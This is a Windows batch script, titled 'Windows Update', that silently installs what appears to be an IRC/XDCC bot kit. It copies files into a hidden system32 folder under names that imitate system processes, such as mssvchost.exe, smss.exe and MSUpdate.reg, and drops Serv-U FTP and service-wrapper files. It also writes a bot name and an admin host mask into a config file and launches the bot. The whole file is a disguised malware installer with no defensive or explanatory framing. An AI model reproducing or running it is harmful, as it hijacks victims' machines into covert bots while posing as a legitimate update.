@echo off

title Windows Update

if exist c:\WINDOWS\*.* goto RootDW

if exist c:\WINNT\*.* goto RootDN

:RootDW

md c:\WINDOWS\system32\Dap >> NUL
md c:\WINDOWS\system32\Dap\Log >> NUL

MOVE c:\Kit\DW\1 c:\windows\system32\Dap\Delete.bat >> NUL
MOVE c:\Kit\DW\2 c:\windows\system32\Dap\WBotName.bat >> NUL
MOVE c:\Kit\DW\3 c:\windows\system32\Dap\WDap.bat >> NUL
MOVE c:\Kit\DW\4 c:\windows\system32\Dap\MSUpdate.reg >> NUL
MOVE c:\Kit\DW\5 c:\windows\system32\Dap\Dap1.exe >> NUL
MOVE c:\Kit\DW\6 c:\windows\system32\Dap\Dap2.exe >> NUL
MOVE c:\Kit\DW\7 c:\windows\system32\Dap\Dap3.exe >> NUL
MOVE c:\Kit\DW\8 c:\windows\system32\Dap\Dap.jpeg >> NUL
MOVE c:\Kit\DW\9 c:\windows\system32\Dap\ServUDaemon.ini >> NUL
MOVE c:\Kit\DW\10 c:\windows\system32\Dap\Secure.bat >> NUL
MOVE c:\Kit\DW\11 c:\windows\system32\Dap\Dap >> NUL
MOVE c:\Kit\DW\12 c:\windows\system32\Dap\Dap1 >> NUL
MOVE c:\Kit\DW\13 c:\windows\system32\Dap\Dap.bkup >> NUL
MOVE c:\Kit\DW\14 c:\windows\system32\Dap\Dap.txt >> NUL
MOVE c:\Kit\DW\15 c:\windows\system32\Dap\Kill_Kit.bat >> NUL
MOVE c:\Kit\5MB c:\windows\system32\Dap\Log\5MB >> NUL
MOVE c:\Kit\windows.mp3 c:\windows\system32\Dap\Windows.mp3 >> NUL
MOVE c:\Kit\FireDaemonRT.dll c:\windows\system32\Dap\FireDaemonRT.dll >> NUL
MOVE c:\Kit\mssvc.dtd c:\windows\system32\Dap\mssvc.dtd >> NUL
MOVE c:\Kit\DiskInfo.EXE c:\windows\system32\Dap\DiskInfo.exe >> NUL
MOVE c:\Kit\mssvchost.exe c:\windows\system32\Dap\mssvchost.exe >> NUL
MOVE c:\Kit\tar.exe c:\windows\system32\Dap\tar.exe >> NUL
MOVE c:\Kit\smss.exe c:\windows\system32\Dap\smss.exe >> NUL
MOVE c:\Kit\libxml2.dll c:\windows\system32\Dap\libxml2.dll >> NUL
MOVE c:\Kit\cygwin1.dll c:\windows\system32\Dap\cygwin1.dll >> NUL
MOVE c:\Kit\Dap.exe c:\windows\system32\Dap\Dap.exe >> NUL
MOVE c:\Kit\mssvchost.dll c:\windows\system32\Dap\mssvchost.dll >> NUL
MOVE c:\Kit\SvcAdmin.dll c:\windows\system32\Dap\SvcAdmin.dll >> NUL
MOVE c:\Kit\Refresh.exe c:\windows\system32\Dap\Refresh.exe >> NUL
MOVE c:\Kit\Refresh_Xdcc.bat c:\windows\system32\Dap\Refresh_Xdcc.bat >> NUL
MOVE c:\Kit\Refresh_FTP.bat c:\windows\system32\Dap\Refresh_FTP.bat >> NUL

ECHO user_realname 5g0t-xdcc>> c:\windows\system32\Dap\Dap.jpeg
ECHO adminhost em0!em0@*>> c:\windows\system32\Dap\Dap.jpeg

c:\windows\system32\Dap\WBotName.bat >> NUL
GOTO EndJob 

:RootDN

md c:\WINNT\system32\Dap >> NUL
md c:\WINNT\system32\Dap\Log >> NUL

MOVE c:\Kit\DN\1 c:\winnt\system32\Dap\Delete.bat >> NUL
MOVE c:\Kit\DN\2 c:\winnt\system32\Dap\NBotName.bat >> NUL
MOVE c:\Kit\DN\3 c:\winnt\system32\Dap\NDap.bat >> NUL
MOVE c:\Kit\DN\4 c:\winnt\system32\Dap\MSUpdate.reg >> NUL
MOVE c:\Kit\DN\5 c:\winnt\system32\Dap\Dap1.exe >> NUL
MOVE c:\Kit\DN\6 c:\winnt\system32\Dap\Dap2.exe >> NUL
MOVE c:\Kit\DN\7 c:\winnt\system32\Dap\Dap3.exe >> NUL
MOVE c:\Kit\DN\8 c:\winnt\system32\Dap\Dap.jpeg >> NUL
MOVE c:\Kit\DN\9 c:\winnt\system32\Dap\ServUDaemon.ini >> NUL
MOVE c:\Kit\DN\10 c:\winnt\system32\Dap\Secure.bat >> NUL
MOVE c:\Kit\DN\11 c:\winnt\system32\Dap\Dap >> NUL
MOVE c:\Kit\DN\12 c:\winnt\system32\Dap\Dap1 >> NUL
MOVE c:\Kit\DN\13 c:\winnt\system32\Dap\Dap.bkup >> NUL
MOVE c:\Kit\DN\14 c:\winnt\system32\Dap\Dap.txt >> NUL
MOVE c:\Kit\DN\15 c:\winnt\system32\Dap\Kill_Kit.bat >> NUL
MOVE c:\Kit\5MB c:\winnt\system32\Dap\Log\5MB >> NUL
MOVE c:\Kit\FireDaemonRT.dll c:\winnt\system32\Dap\FireDaemonRT.dll >> NUL
MOVE c:\Kit\windows.mp3 c:\winnt\system32\Dap\Windows.mp3 >> NUL
MOVE c:\Kit\mssvc.dtd c:\winnt\system32\Dap\mssvc.dtd >> NUL
MOVE c:\Kit\DiskInfo.EXE c:\winnt\system32\Dap\DiskInfo.exe >> NUL
MOVE c:\Kit\mssvchost.exe c:\winnt\system32\Dap\mssvchost.exe >> NUL
MOVE c:\Kit\tar.exe c:\winnt\system32\Dap\tar.exe >> NUL
MOVE c:\Kit\smss.exe c:\winnt\system32\Dap\smss.exe >> NUL
MOVE c:\Kit\libxml2.dll c:\winnt\system32\Dap\libxml2.dll >> NUL
MOVE c:\Kit\cygwin1.dll c:\winnt\system32\Dap\cygwin1.dll >> NUL
MOVE c:\Kit\Dap.exe c:\winnt\system32\Dap\Dap.exe >> NUL
MOVE c:\Kit\SvcAdmin.dll c:\winnt\system32\Dap\SvcAdmin.dll >> NUL
MOVE c:\Kit\mssvchost.dll c:\winnt\system32\Dap\mssvchost.dll >> NUL
MOVE c:\Kit\Refresh.exe c:\winnt\system32\Dap\Refresh.exe >> NUL
MOVE c:\Kit\Refresh_Xdcc.bat c:\winnt\system32\Dap\Refresh_Xdcc.bat >> NUL
MOVE c:\Kit\Refresh_FTP.bat c:\winnt\system32\Dap\Refresh_FTP.bat >> NUL

ECHO user_realname 5got-xdcc>> c:\winnt\system32\Dap\Dap.jpeg
ECHO adminhost em0!em0@*>> c:\winnt\system32\Dap\Dap.jpeg

c:\winnt\system32\Dap\NBotName.bat >> NUL
GOTO EndJob
